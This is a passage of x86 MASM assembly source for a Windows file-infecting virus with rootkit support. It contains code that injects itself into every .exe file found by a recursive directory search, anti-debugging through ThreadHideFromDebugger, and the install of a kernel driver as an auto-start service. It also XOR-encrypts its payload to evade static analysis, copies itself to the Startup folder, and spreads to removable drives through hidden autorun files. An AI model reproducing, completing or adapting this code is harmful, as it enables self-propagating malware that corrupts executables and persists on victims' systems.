			assume	edi:ptr IMAGE_SECTION_HEADER
			mov	ecx,[edi].PointerToRawData
			add	ecx,[edi].SizeOfRawData
			mov	dwExtraDataSize,ecx
			
			; Release mapped file
			invoke	UnmapViewOfFile, lpStart
			mov	lpStart,0
			invoke	CloseHandle, hMap
			mov	hMap,0
			
			; code inject offset
			invoke	SetFilePointer,hFile,dwExtraDataSize,NULL,FILE_BEGIN
			mov	pCodeStart,eax
			
			; Save extra data first.
			invoke	GetFileSize,hFile,NULL
			mov	ecx,dwExtraDataSize
			sub	eax,ecx
			mov	dwExtraDataSize,eax
			.if	eax
				invoke	GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,eax
				mov	pExtraData,eax
				invoke	SetFilePointer,hFile,pCodeStart,0,FILE_BEGIN
				invoke	ReadFile,hFile,pExtraData,dwExtraDataSize,addr dwNumberOfBytesRead,NULL
			.endif
			
			; Inject code.
			invoke	SetFilePointer,hFile,1000h,0,FILE_END	; Hard code
			invoke	SetEndOfFile,hFile
			invoke	SetFilePointer,hFile,pCodeStart,0,FILE_BEGIN
			invoke	WriteFile,hFile,offset INJECTCODE_START,INJECTCODE_LEN,addr dwNumberOfBytesWritten,NULL
			
			; Write extra data to the file end
			mov	eax,pExtraData
			.if	eax
				push	eax
				invoke	SetFilePointer,hFile,pCodeStart,0,FILE_BEGIN
				invoke	SetFilePointer,hFile,1000h,NULL,FILE_CURRENT
				invoke	WriteFile,hFile,pExtraData,dwExtraDataSize,addr dwNumberOfBytesWritten,NULL
				pop	eax
				invoke	GlobalFree,eax
			.endif
			.break
		.endw
		
		; do some cleaning.
		.if	lpStart
			invoke	UnmapViewOfFile, lpStart
		.endif
		.if	hMap
			invoke	CloseHandle, hMap
		.endif
		.if	hFile != INVALID_HANDLE_VALUE
			invoke	CloseHandle, hFile
		.endif
		
		popad
		ret
InfectPE 	endp


;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Recursive search .exe file
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
SearchFile	proc	szStartPath:PTR BYTE
		LOCAL	hFindFile:DWORD
		LOCAL	FindData:WIN32_FIND_DATA
		LOCAL	szSerch[MAX_PATH]:BYTE
		LOCAL	szFilePath[MAX_PATH]:BYTE
					
		invoke	lstrcpy, addr szSerch, szStartPath
		invoke	lstrcat, addr szSerch, addr szFileFilter
		invoke	FindFirstFile, addr szSerch, addr FindData
		.if	eax == INVALID_HANDLE_VALUE
			ret
		.endif	
		mov	hFindFile, eax
		.while	TRUE
			; Filt "." and ".."
			invoke	lstrcmp, addr FindData.cFileName, addr szSglDot
			mov	ebx, eax
			invoke	lstrcmp, addr FindData.cFileName, addr szDblDot
			and	eax, ebx
			
			.if	eax
				invoke	lstrcpy, addr szFilePath, szStartPath
				invoke	lstrcat, addr szFilePath, addr szSeparator
				invoke	lstrcat, addr szFilePath, addr FindData.cFileName
				
				.if	FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY	
					; If this is a directory, go on traverse
					invoke	SearchFile, addr szFilePath
				.else
					; If this file's extension is '.exe', call InfectPE to progress it, anthing else is ingored.
					lea	esi, FindData.cFileName
					invoke	lstrlen, esi
					.if	eax >= 4
						add	esi, eax
						sub	esi, 4 
						invoke	lstrcmpi, esi, addr szExeExt
						.if	!eax
							invoke	InfectPE, addr szFilePath
						.endif
					.endif
				.endif
				
			.endif		
			
			invoke	FindNextFile, hFindFile, addr FindData
			.break .if eax == 0
		.endw
		invoke	FindClose, hFindFile
		ret
SearchFile 	endp


start		proc
		LOCAL	hSysFile:HANDLE
		LOCAL	hSCManager:SC_HANDLE
		LOCAL	hService:SC_HANDLE
		LOCAL	dwNumberOfBytesWritten:DWORD
		LOCAL	szCurDir[MAX_PATH]:BYTE
		LOCAL	MemBasicInfo:MEMORY_BASIC_INFORMATION
		LOCAL	hDevice:HANDLE
		LOCAL	dwPID:DWORD
		LOCAL	dwOutBuffer:DWORD
		LOCAL	dwBytesReturned:DWORD
		LOCAL	szDriveStrings[64]:BYTE
		LOCAL	szAtRunPath[256]:BYTE
		LOCAL	szInfectPath[256]:BYTE
		LOCAL	hAtRun:HANDLE
		LOCAL	dwAtRunBytesWritten:DWORD
		LOCAL	ZwSetInformationThread:DWORD
		
		;anti debug
		invoke	GetModuleHandle,addr szNtDll
		invoke	GetProcAddress,eax,addr szProcName
		mov	ZwSetInformationThread,eax
		push	0
		push	0
		push	17 ; ThreadHideFromDebugger
		invoke	GetCurrentThread
		push	eax
		call	ZwSetInformationThread
		
		mov	hService,0
		; Release file to C:\InfectPE.sys
		invoke	CreateFile,offset szFileRlsPath,GENERIC_READ,FILE_SHARE_READ or FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL
		.if	eax == INVALID_HANDLE_VALUE
			invoke	CreateFile,offset szFileRlsPath,GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL
			mov	hSysFile,eax
			mov	dwNumberOfBytesWritten,0
			invoke	WriteFile,hSysFile,offset SysFileBytes,FileSize,addr dwNumberOfBytesWritten,NULL
			invoke	CloseHandle,hSysFile
		.else
			invoke	CloseHandle,eax
		.endif
		; Load ROOTKIT Driver(Process & File Guard)
		.while	TRUE
			invoke	OpenSCManager,NULL,NULL,SC_MANAGER_ALL_ACCESS
			mov	hSCManager,eax
			.break	.if hSCManager == NULL
			invoke	OpenService,hSCManager,offset szServiceName,SERVICE_ALL_ACCESS
			mov	hService,eax
			.if eax != NULL
				; Service has exist,check whether it's running.
				invoke	StartService,hService,NULL,NULL
				.break
			.else
				invoke	GetLastError
				.if	eax == ERROR_SERVICE_DOES_NOT_EXIST
					; The service doesn't exist,create the service. (SERVICE_AUTO_START SERVICE_DEMAND_START)
					invoke	CreateService,hSCManager,offset szServiceName,offset szServiceName,SERVICE_ALL_ACCESS,SERVICE_KERNEL_DRIVER,SERVICE_AUTO_START,SERVICE_ERROR_IGNORE,offset szFileRlsPath,NULL,NULL,NULL,NULL,NULL
					mov	hService,eax
					.break	.if hService == NULL
					invoke	StartService,hService,NULL,NULL
				.endif
			.endif
			.break
		.endw
		; do some cleaning...
		.if	hSCManager
			invoke	CloseServiceHandle,hSCManager
		.endif
		.if	hService
			invoke	CloseServiceHandle,hService
		.endif

		; Remove CODE SEGMENT write protection
		invoke	VirtualQuery,offset INJECTCODE_START,addr MemBasicInfo,sizeof MEMORY_BASIC_INFORMATION
		invoke	VirtualProtect,MemBasicInfo.BaseAddress,MemBasicInfo.RegionSize,PAGE_READWRITE,addr MemBasicInfo.Protect
		
		; Encrypt the code to be injected, ANTI static disassembly
		mov	ecx,ENCRYPT_LEN
		shr	ecx,2
		lea	esi,ENCRYPT_START
		.while	TRUE
			.break	.if	ecx == 0
			mov	eax,dword ptr [esi]
			xor	eax,1989
			mov	dword ptr [esi],eax
			add	esi,4
			dec	ecx
		.endw
		
		; Recursive search .exe file & infect.
		invoke	GetCurrentDirectory, MAX_PATH, addr szCurDir
		invoke	SearchFile, addr szCurDir
		
		; Protect self process
		invoke	CreateFile,addr szSymbbolicLink,0,FILE_SHARE_READ or FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL
		mov	hDevice,eax
		.if	eax != INVALID_HANDLE_VALUE
			invoke	GetCurrentProcessId
			mov	dwPID,eax
			invoke	DeviceIoControl,hDevice,IOCTL_INFECTPE,addr dwPID,4,addr dwOutBuffer,4,addr dwBytesReturned,NULL
			invoke	CloseHandle,hDevice
		.endif
		
		; copy self to [startup] folder.
		invoke	SHGetSpecialFolderPath,NULL,addr szAtRunPath,CSIDL_COMMON_STARTUP,FALSE
		invoke	_imp__strcat,addr szAtRunPath,addr szSeparator
		invoke	_imp__strcat,addr szAtRunPath,offset szAtRunBytes + 16
		invoke	GetModuleFileName,NULL,addr szInfectPath,256
		invoke	CopyFile,addr szInfectPath,addr szAtRunPath,TRUE
		
		; infect removable device
		.while	TRUE
			invoke	GetLogicalDriveStrings,64,addr szDriveStrings			
			.if	eax !=0 && eax < 64
				lea	esi,szDriveStrings
		
				.while	BYTE PTR [esi] != 0
					invoke	GetDriveType,esi
					.if	eax == DRIVE_REMOVABLE
						invoke	RtlZeroMemory,addr szAtRunPath,256
						invoke	_imp__strcat,addr szAtRunPath,esi
						invoke	_imp__strcat,addr szAtRunPath,addr szAtRunFileName
						invoke	CreateFile,addr szAtRunPath,GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_SYSTEM,NULL
						.if	eax != INVALID_HANDLE_VALUE
							mov	hAtRun,eax
							invoke	WriteFile,hAtRun,addr szAtRunBytes,28,addr dwAtRunBytesWritten,NULL
							invoke	CloseHandle,hAtRun
							invoke	RtlZeroMemory,addr szInfectPath,256
							invoke	_imp__strcat,addr szInfectPath,esi
							invoke	_imp__strcat,addr szInfectPath,offset szAtRunBytes + 16
							invoke	GetModuleFileName,NULL,addr szAtRunPath,256
							invoke	CopyFile,addr szAtRunPath,addr szInfectPath,TRUE
							invoke	GetFileAttributes,addr szInfectPath
							.if	eax != INVALID_FILE_ATTRIBUTES
								or	eax,FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_SYSTEM
								invoke	SetFileAttributes,addr szInfectPath,eax
							.endif
						.endif
					.endif
					add	esi,4
				.endw

			.endif
			invoke	Sleep,3000
		.endw
		invoke	ExitProcess, 0
start		endp
end		start